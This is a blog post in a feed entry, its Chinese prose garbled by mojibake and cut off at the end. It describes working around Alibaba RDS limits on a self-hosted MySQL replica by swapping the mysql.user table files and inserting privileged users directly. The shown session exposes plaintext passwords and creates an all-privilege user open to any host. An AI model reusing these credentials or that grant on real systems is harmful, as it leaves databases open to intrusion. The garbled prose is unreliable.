    <title>çªç ´é˜¿é‡Œé™åˆ¶å®ç°&quot;RDS For MySQL 5.7åˆ°è‡ªå»ºMySQLä¸»ä»&quot;</title>
    <link href="http://www.toberoot.com/2018/08/22/booboo_others/rds-for-mysql-5-7%E5%88%B0%E8%87%AA%E5%BB%BAMySQL%E4%B8%BB%E4%BB%8E%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3user%E8%A1%A8%E5%AE%9E%E7%8E%B0%E4%BB%8E%E5%BA%93%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E6%9B%B4%E6%94%B9%E5%8A%9F%E8%83%BD/"/>
    <id>http://www.toberoot.com/2018/08/22/booboo_others/rds-for-mysql-5-7%E5%88%B0%E8%87%AA%E5%BB%BAMySQL%E4%B8%BB%E4%BB%8E%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3user%E8%A1%A8%E5%AE%9E%E7%8E%B0%E4%BB%8E%E5%BA%93%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E6%9B%B4%E6%94%B9%E5%8A%9F%E8%83%BD/</id>
    <published>2018-08-22T10:41:15.000Z</published>
    <updated>2020-03-22T08:32:42.581Z</updated>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦: é˜¿é‡Œäº‘çš„RDS For MySQL 5.7 åˆ°çº¿ä¸‹IDCæœºæˆ¿çš„ä¸»ä»æ­å»ºç›¸ä¿¡çœ‹å®˜æ–¹æ–‡æ¡£å°±å¯ä»¥å®Œæˆï¼Œä½†æ˜¯æ­å»ºä¹‹åå´å‘ç°æ— æ³•åœ¨æœ¬åœ°è¿›è¡Œè®¤è¯æƒé™çš„ç®¡ç†ï¼Œè¿™æ˜¯ä¸ºä½•ï¼Ÿè€Œé˜¿é‡Œå®˜æ–¹æ¨èä½¿ç”¨DTSåŒæ­¥å·¥å…·å»å®ç°ï¼Œè¿™ä¸ªè´¹ç”¨ç€å®ä¸å°‘ï¼Œåˆæ˜¯å¦èƒ½å¤Ÿç ´è§£å‘¢ï¼Ÿæœ¬æ–‡è¯¦è§£å¦‚ä½•æš´åŠ›ç ´è§£userè¡¨å®ç°ä»åº“ç”¨æˆ·æƒé™æ›´æ”¹åŠŸèƒ½</p><a id="more"></a><h1 id="æ•…äº‹èƒŒæ™¯"><a href="#æ•…äº‹èƒŒæ™¯" class="headerlink" title="æ•…äº‹èƒŒæ™¯"></a>æ•…äº‹èƒŒæ™¯</h1><h2 id="æ•°æ®åº“æ˜ç»†"><a href="#æ•°æ®åº“æ˜ç»†" class="headerlink" title="æ•°æ®åº“æ˜ç»†"></a>æ•°æ®åº“æ˜ç»†</h2><p>è¯´åœ¨å‰é¢ï¼š</p><ul><li>äº‘ä¸Šæ•°æ®åº“ï¼š RDS For MySQL 5.7.20 æ™®é€šç”¨æˆ·æƒé™</li><li>IDCæ•°æ®åº“: MySQL 5.7.20 </li></ul><h2 id="æ•…äº‹æƒ…èŠ‚"><a href="#æ•…äº‹æƒ…èŠ‚" class="headerlink" title="æ•…äº‹æƒ…èŠ‚"></a>æ•…äº‹æƒ…èŠ‚</h2><p>ç°éœ€è¦æ­å»ºRDS For MySQL åˆ°çº¿ä¸‹IDCæœºæˆ¿çš„ä¸»ä»ï¼Œé—®é¢˜å¦‚ä¸‹ï¼š</p><h3 id="åŒæ­¥ç³»ç»Ÿè¡¨å¤±è´¥"><a href="#åŒæ­¥ç³»ç»Ÿè¡¨å¤±è´¥" class="headerlink" title="åŒæ­¥ç³»ç»Ÿè¡¨å¤±è´¥"></a>åŒæ­¥ç³»ç»Ÿè¡¨å¤±è´¥</h3><h4 id="æ•…éšœåŸå› "><a href="#æ•…éšœåŸå› " class="headerlink" title="æ•…éšœåŸå› "></a>æ•…éšœåŸå› </h4><ul><li>RDS For MySQL 5.7.20 åˆ°è‡ªå»ºMySQL 5.7.20ä¸»ä»åŒæ­¥å¼‚å¸¸çš„åŸå› ä¸ºRDSä¸MySQLå®˜æ–¹ç‰ˆæœ¬ä½¿ç”¨çš„ç³»ç»Ÿåº“ä¸åŒ</li><li>è‡ªå»ºMySQL 5.7.20 æ— æ³•åŒæ­¥ä¸»åº“RDSçš„ç³»ç»Ÿè¡¨</li><li>è‡ªå»ºMySQL 5.7.20 æ¢å¤RDSçš„å…¨å¤‡ä»½æ•°æ®åæ— æ³•æ‰§è¡Œæˆæƒè¯­å¥,æŠ¥é”™å¦‚ä¸‹ï¼š</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1785 (HY000): Statement violates GTID consistency: Updates to non-transactional tables can only be done in either autocommitted statements or single-statement transactions, and never in the same statement as updates to transactional tables.</span><br></pre></td></tr></table></figure><ul><li>è‡ªå»ºMySQL 5.7.20 æ¢å¤RDSçš„å…¨å¤‡ä»½æ•°æ®åæ— æ³•å¯¹ç³»ç»Ÿè¡¨æ‰§è¡Œæ›´æ–°æ“ä½œï¼ŒæŠ¥é”™å¦‚ä¸‹ï¼š</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1064 (42000): Unknown trigger has an error in its body: 'Unknown system variable 'maintain_user_list''</span><br></pre></td></tr></table></figure><h4 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h4><ul><li>è·³è¿‡ç³»ç»Ÿè¡¨çš„åŒæ­¥</li></ul><hr><h3 id="ä»åº“æ·»åŠ è®¤è¯æˆæƒå¤±è´¥"><a href="#ä»åº“æ·»åŠ è®¤è¯æˆæƒå¤±è´¥" class="headerlink" title="ä»åº“æ·»åŠ è®¤è¯æˆæƒå¤±è´¥"></a>ä»åº“æ·»åŠ è®¤è¯æˆæƒå¤±è´¥</h3><p>RDS For MySQL 5.7.20 åˆ°è‡ªå»ºMySQL 5.7.20 æ­å»ºä¸»ä»åŒæ­¥æ¶æ„:</p><ul><li>é…ç½®ä»åº“ä¸åŒæ­¥RDSä¸»åº“çš„ç³»ç»Ÿè¡¨</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># skip rep</span><br><span class="line">replicate_wild_ignore_table&#x3D;mysql.%</span><br><span class="line">replicate_wild_ignore_table&#x3D;sys.%</span><br><span class="line">replicate_wild_ignore_table&#x3D;information_schema.%</span><br></pre></td></tr></table></figure><ul><li><strong>éç³»ç»Ÿåº“æ•°æ®åŒæ­¥æ­£å¸¸</strong></li><li>ä»åº“æ— æ³•æ‰§è¡Œgrantå‘½ä»¤ï¼Œå³æ— æ³•æ·»åŠ æˆæƒä¿¡æ¯</li><li>ä»åº“æ— æ³•å¯¹ç³»ç»Ÿè¡¨mysql.userè¡¨æ‰§è¡Œinsertæ“ä½œ</li><li>ä»åº“æ— æ³•å¯¹ç³»ç»Ÿè¡¨mysql.userè¡¨æ‰§è¡Œupdatæ“ä½œ</li></ul><p>æŠ¥é”™å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1064 (42000): Unknown trigger has an error in its body: 'Unknown system variable 'maintain_user_list''</span><br></pre></td></tr></table></figure><h4 id="å¤±è´¥åŸå› "><a href="#å¤±è´¥åŸå› " class="headerlink" title="å¤±è´¥åŸå› "></a>å¤±è´¥åŸå› </h4><p><strong>é˜¿é‡Œå·¥å•ç­”å¤</strong>ï¼šRDS ç›®å‰å·²ç»ä¸æ”¯æŒ MYISAM å¼•æ“åˆ›å»ºäº†ã€‚æ‰€ä»¥å¦‚æœæ˜¯é€šè¿‡è‡ªå»ºçš„replication åŒæ­¥ å°±ä¼šæœ‰è¿™ä¸ªé—®é¢˜çš„ï¼ŒRDS ç»Ÿä¸€INNOB å¼•æ“ã€‚<br>å¦‚æœéœ€æ±‚æ˜¯ä»RDS åˆ°è‡ªå»ºæ•°æ®åº“çš„åŒæ­¥å…³ç³»ï¼Œå»ºè®®æ‚¨ä½¿ç”¨DTS åšä¸šåŠ¡æ•°æ®çš„åŒæ­¥ã€‚</p><h4 id="æ¢ç´¢è§£å†³æ–¹æ³•"><a href="#æ¢ç´¢è§£å†³æ–¹æ³•" class="headerlink" title="æ¢ç´¢è§£å†³æ–¹æ³•"></a>æ¢ç´¢è§£å†³æ–¹æ³•</h4><h5 id="ä»åº“å°è¯•ä½¿ç”¨MySQL8-0-11"><a href="#ä»åº“å°è¯•ä½¿ç”¨MySQL8-0-11" class="headerlink" title="ä»åº“å°è¯•ä½¿ç”¨MySQL8.0.11"></a>ä»åº“å°è¯•ä½¿ç”¨<code>MySQL8.0.11</code></h5><p>RDS For MySQL 5.7çš„å¤‡ä»½æ–‡ä»¶ åˆ°çº¿ä¸‹è‡ªå»ºMYSQL 8.0.11 æ— æ³•æ¢å¤æ•°æ®ã€‚å› æ­¤è¯¥æ–¹æ³•ä¸å¯è¡Œã€‚</p><h5 id="å°è¯•ä¸´æ—¶å…³é—­GTIDæ¨¡å¼"><a href="#å°è¯•ä¸´æ—¶å…³é—­GTIDæ¨¡å¼" class="headerlink" title="å°è¯•ä¸´æ—¶å…³é—­GTIDæ¨¡å¼"></a>å°è¯•ä¸´æ—¶å…³é—­GTIDæ¨¡å¼</h5><ol><li>ä¸´æ—¶åœæ­¢slaveåŒæ­¥</li><li>ä¿®æ”¹é…ç½®å…³é—­gtidæ¨¡å¼</li><li>é‡å¯æœåŠ¡</li></ol><p>å¯¹ç³»ç»Ÿè¡¨mysql.useræµ‹è¯•æ˜ç»†ï¼š</p><table><thead><tr><th>No.</th><th>æµ‹è¯•é¡¹ç›®</th><th>ç»“æœ</th></tr></thead><tbody><tr><td>1</td><td>æ˜¯å¦èƒ½å¤Ÿæ‰§è¡Œgrantå‘½ä»¤</td><td>Ã—</td></tr><tr><td>2</td><td>æ˜¯å¦èƒ½å¤Ÿæ‰§è¡Œupdateå‘½ä»¤</td><td>Ã—</td></tr><tr><td>3</td><td>æ˜¯å¦èƒ½å¤Ÿæ‰§è¡Œinsertå‘½ä»¤</td><td>Ã—</td></tr></tbody></table><p>è¯¥æ–¹æ³•åŒæ ·æ— æ³•è§£å†³ã€‚</p><h2 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h2><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> æƒé™ç›¸å…³çš„ä¸€äº›è¡¨ï¼š</span></span><br><span class="line">SCHEMA_PRIVILEGESï¼šæä¾›äº†æ•°æ®åº“çš„ç›¸å…³æƒé™ï¼Œè¿™ä¸ªè¡¨æ˜¯å†…å­˜è¡¨æ˜¯ä»mysql.dbä¸­æ‹‰å»å‡ºæ¥çš„ã€‚</span><br><span class="line">TABLE_PRIVILEGES:æä¾›çš„æ˜¯è¡¨æƒé™ç›¸å…³ä¿¡æ¯ï¼Œä¿¡æ¯æ˜¯ä» mysql.tables_priv è¡¨ä¸­åŠ è½½çš„</span><br><span class="line">COLUMN_PRIVILEGES ï¼šè¿™ä¸ªè¡¨å¯ä»¥æ¸…æ¥šå°±èƒ½çœ‹åˆ°è¡¨æˆæƒçš„ç”¨æˆ·çš„å¯¹è±¡ï¼Œé‚£å¼ è¡¨é‚£ä¸ªåº“ä»¥åŠæˆäºˆçš„æ˜¯ä»€ä¹ˆæƒé™ï¼Œå¦‚æœæˆæƒçš„æ—¶å€™åŠ ä¸Šwith grant optionçš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹å¾—åˆ°PRIVILEGE_TYPEè¿™ä¸ªå€¼å¿…é¡»æ˜¯YESã€‚</span><br><span class="line">USER_PRIVILEGES:æä¾›çš„æ˜¯è¡¨æƒé™ç›¸å…³ä¿¡æ¯ï¼Œä¿¡æ¯æ˜¯ä» mysql.user è¡¨ä¸­åŠ è½½çš„</span><br><span class="line">é€šè¿‡è¡¨æˆ‘ä»¬å¯ä»¥å¾ˆæ¸…æ™°çœ‹å¾—åˆ°MySQLæˆæƒçš„å±‚æ¬¡ï¼ŒSCHEMAï¼ŒTABLEï¼ŒCOLUMNçº§åˆ«ï¼Œå½“ç„¶è¿™äº›éƒ½æ˜¯åŸºäºç”¨æˆ·æ¥æˆäºˆçš„</span><br></pre></td></tr></table></figure><p>ä»æ•°æ®åº“ç”¨æˆ·æƒé™ç®¡ç†çš„åŸç†å¯ä»¥äº†è§£åˆ°ç®¡ç†ç”¨æˆ·çš„æ˜¯<code>user</code>è¡¨ï¼Œå¦‚æœè¦æ›´ç»†è‡´çš„æƒé™è¿˜éœ€è¦<code>db</code>è¡¨å’Œ<code>tables_priv</code>è¡¨ã€‚<em>ï¼ˆæœ¬æ–‡åªä»userè¡¨ç€æ‰‹ï¼‰</em></p><h3 id="æ­¥éª¤æ¦‚è§ˆ"><a href="#æ­¥éª¤æ¦‚è§ˆ" class="headerlink" title="æ­¥éª¤æ¦‚è§ˆ"></a>æ­¥éª¤æ¦‚è§ˆ</h3><ol><li>åˆ›å»ºæ–°çš„user_1è¡¨</li><li>å¯¹user_1è¡¨æ·»åŠ æ–°çš„ç”¨æˆ·</li><li>åœæœåŠ¡</li><li>å°†user_1æ›¿æ¢userè¡¨</li><li>å¯åŠ¨è¯¥æœåŠ¡</li><li>å¯ä»¥é€šè¿‡updateã€insertã€deleteæ“ä½œuserè¡¨æ¥æ·»åŠ æƒé™ï¼ˆgrantæ— æ³•æ“ä½œï¼‰</li></ol><h3 id="æµ‹è¯•ç¯å¢ƒ"><a href="#æµ‹è¯•ç¯å¢ƒ" class="headerlink" title="æµ‹è¯•ç¯å¢ƒ"></a>æµ‹è¯•ç¯å¢ƒ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line">root@MySQL-01 10:35:  [mysql]&gt; create table user_1 like user;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:36:  [mysql]&gt; select * from user_1;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:36:  [mysql]&gt; show table status like user;</span><br><span class="line">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'user' at line 1</span><br><span class="line">root@MySQL-01 10:36:  [mysql]&gt; show table status like 'user_1';</span><br><span class="line">+--------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+------------+-----------+----------+----------------+-----------------------------+</span><br><span class="line">| Name   | Engine | Version | Row_format | Rows | Avg_row_length | Data_length | Max_data_length | Index_length | Data_free | Auto_increment | Create_time         | Update_time         | Check_time | Collation | Checksum | Create_options | Comment                     |</span><br><span class="line">+--------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+------------+-----------+----------+----------------+-----------------------------+</span><br><span class="line">| user_1 | MyISAM |      10 | Dynamic    |    0 |              0 |           0 | 281474976710655 |         1024 |         0 |           NULL | 2019-01-04 10:36:00 | 2019-01-04 10:36:00 | NULL       | utf8_bin  |     NULL |                | Users and global privileges |</span><br><span class="line">+--------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+------------+-----------+----------+----------------+-----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:36:  [mysql]&gt; show table status like 'user';</span><br><span class="line">+------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+---------------------+-----------+----------+----------------+-----------------------------+</span><br><span class="line">| Name | Engine | Version | Row_format | Rows | Avg_row_length | Data_length | Max_data_length | Index_length | Data_free | Auto_increment | Create_time         | Update_time         | Check_time          | Collation | Checksum | Create_options | Comment                     |</span><br><span class="line">+------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+---------------------+-----------+----------+----------------+-----------------------------+</span><br><span class="line">| user | MyISAM |      10 | Dynamic    |    3 |             53 |         160 | 281474976710655 |         2048 |         0 |           NULL | 2015-05-22 15:24:42 | 2019-01-04 09:27:49 | 2015-05-22 15:33:22 | utf8_bin  |     NULL |                | Users and global privileges |</span><br><span class="line">+------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+---------------------+-----------+----------+----------------+-----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:36:  [mysql]&gt; insert into user_1 select * from user;</span><br><span class="line">Query OK, 3 rows affected (0.00 sec)</span><br><span class="line">Records: 3  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:36:  [mysql]&gt; select * from user_1;</span><br><span class="line">+-----------+------+----------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+</span><br><span class="line">| Host      | User | Password | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin | authentication_string |</span><br><span class="line">+-----------+------+----------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+</span><br><span class="line">| localhost | root |          | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |</span><br><span class="line">| 127.0.0.1 | root |          | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |</span><br><span class="line">| ::1       | root |          | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |</span><br><span class="line">+-----------+------+----------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:36:  [mysql]&gt; select user,host,authentication_string from user_1;</span><br><span class="line">+------+-----------+-----------------------+</span><br><span class="line">| user | host      | authentication_string |</span><br><span class="line">+------+-----------+-----------------------+</span><br><span class="line">| root | localhost |                       |</span><br><span class="line">| root | 127.0.0.1 |                       |</span><br><span class="line">| root | ::1       |                       |</span><br><span class="line">+------+-----------+-----------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:36:  [mysql]&gt; update user_1 set authentication_string=password('(Uploo00king)') where user='root';</span><br><span class="line">Query OK, 3 rows affected, 1 warning (0.01 sec)</span><br><span class="line">Rows matched: 3  Changed: 3  Warnings: 1</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:37:  [mysql]&gt; select user,host,authentication_string from user_1;</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">| user | host      | authentication_string                     |</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">| root | localhost | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">| root | 127.0.0.1 | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">| root | ::1       | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:37:  [mysql]&gt; exit</span><br><span class="line">Bye</span><br><span class="line">[root@sh_02 data]# /etc/init.d/mysqld stop</span><br><span class="line">Shutting down MySQL..                                      [  OK  ]</span><br><span class="line">[root@sh_02 mysql]# ll user_1*</span><br><span class="line">-rw-r-----. 1 mysql mysql 10630 Jan  4 10:36 user_1.frm</span><br><span class="line">-rw-r-----. 1 mysql mysql   328 Jan  4 10:37 user_1.MYD</span><br><span class="line">-rw-r-----. 1 mysql mysql  2048 Jan  4 10:37 user_1.MYI</span><br><span class="line">[root@sh_02 mysql]# mv user_1.frm user.frm</span><br><span class="line">[root@sh_02 mysql]# mv user_1.MYD user.MYD</span><br><span class="line">[root@sh_02 mysql]# mv user_1.MYI user.MYI</span><br><span class="line">[root@sh_02 mysql]# ll user*</span><br><span class="line">-rw-r-----. 1 mysql mysql 10630 Jan  4 10:36 user.frm</span><br><span class="line">-rw-r-----. 1 mysql mysql   328 Jan  4 10:37 user.MYD</span><br><span class="line">-rw-r-----. 1 mysql mysql  2048 Jan  4 10:37 user.MYI</span><br><span class="line">-rw-rw----. 1 mysql mysql  3989 Aug 14 09:14 user_view.frm</span><br><span class="line">[root@sh_02 mysql]# /etc/init.d/mysqld start</span><br><span class="line">Starting MySQL.                                            [  OK  ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@sh_02 mysql]# mysql -uroot -p'(Uploo00king)'</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 6</span><br><span class="line">Server version: 5.7.20-log MySQL Community Server (GPL)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:39:  [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| db1                |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:39:  [(none)]&gt; use mysql</span><br><span class="line">Database changed</span><br><span class="line">root@MySQL-01 10:39:  [mysql]&gt; select user,host from mysql.user;</span><br><span class="line">+------+-----------+</span><br><span class="line">| user | host      |</span><br><span class="line">+------+-----------+</span><br><span class="line">| root | 127.0.0.1 |</span><br><span class="line">| root | ::1       |</span><br><span class="line">| root | localhost |</span><br><span class="line">+------+-----------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:39:  [mysql]&gt; grant all on *.* to booboo@'%' identified by '(Uploo00king)';</span><br><span class="line">ERROR 1785 (HY000): Statement violates GTID consistency: Updates to non-transactional tables can only be done in either autocommitted statements or single-statement transactions, and never in the same statement as updates to transactional tables.</span><br><span class="line"></span><br><span class="line">root@MySQL-01 11:39:  [mysql]&gt; update mysql.user_1 set user='aliyun_root' where host='127.0.0.1';</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line">root@MySQL-01 11:40:  [mysql]&gt; select user,host from mysql.user_1;</span><br><span class="line">+-------------+-----------+</span><br><span class="line">| user        | host      |</span><br><span class="line">+-------------+-----------+</span><br><span class="line">| aliyun_root | 127.0.0.1 |</span><br><span class="line">| root        | ::1       |</span><br><span class="line">| root        | localhost |</span><br><span class="line">+-------------+-----------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">aliyun_root@MySQL-01 11:51:  [mysql]&gt; insert into mysql.user values ('%','jowing', '', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', '', '', '', '', 0, 0, 0, 0, '', password('Joowing@2017'));</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.01 sec)</span><br><span class="line"></span><br><span class="line">aliyun_root@MySQL-01 11:51:  [mysql]&gt; select user,host from  mysql.user;</span><br><span class="line">+-------------+-----------+</span><br><span class="line">| user        | host      |</span><br><span class="line">+-------------+-----------+</span><br><span class="line">| jowing      | %         |</span><br><span class="line">| aliyun_root | 127.0.0.1 |</span><br><span class="line">| root        | ::1       |</span><br><span class="line">| root        | localhost |</span><br><span class="line">+-------------+-----------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="ç”Ÿäº§ç¯å¢ƒ"><a href="#ç”Ÿäº§ç¯å¢ƒ" class="headerlink" 